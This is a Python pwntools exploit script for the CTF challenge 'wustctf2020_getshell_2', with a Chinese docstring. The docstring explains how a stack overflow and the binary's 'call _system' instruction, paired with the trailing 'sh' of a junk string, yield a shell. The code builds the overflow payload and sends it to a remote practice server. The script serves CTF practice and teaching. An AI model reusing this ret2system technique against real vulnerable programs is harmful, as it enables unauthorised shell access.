from pwn import *

'''
关键字:call system、call _ system、system call
题目考察call _system特性：call _system后面直接跟形参值,
只开启了栈不可执行，初步判断是一道栈溢出题目。

主函数中给出漏洞函数，漏洞函数中直接一个栈溢出。

但是后门函数并没有直接给出system(/bin/sh)，而是给了system("/bbbbbbbbin_what_the_f?ck__--??/sh")

这样就不能直接调用后门函数进行getshell。虽然没有给/bin/sh，但是这串字符串的最后sh可以用作参数，
同样可以获取到shell。

但是没法利用system@plt地址，因为plt地址需要返回值，可溢出的地址位数不够0x24-0x18=0xc，
所以只能用shell()里的call _system来调用system，call _system函数不用返回值了，它会自己把下一条指令给压进去

因此payload大致为:
    b'a' * n + system_call_addr + sh_str_addr
'''


def wustctf2020_getshell_2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/wustctf2020_getshell_2'):
    print('wustctf2020_getshell_2 start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 27249)
    target_elf = ELF(file_name)

    sh_str_addr = p32(next(target_elf.search(b'sh')))
    system_plt = p32(0x08048529)

    leave_ret_gadget = p32(0x0804859C)
    pop_ret_gadget = p32(0x08048399)  # pop ebx ; ret

    payload = b'a' * 28
    payload += system_plt + sh_str_addr

    # gdb.attach(target)
    target.sendlineafter(b'/_/  /_/\_,_//_/ /_/ /_//_\_\\', payload)
    target.interactive()
    print('wustctf2020_getshell_2 end')


if __name__ == '__main__':
    wustctf2020_getshell_2()
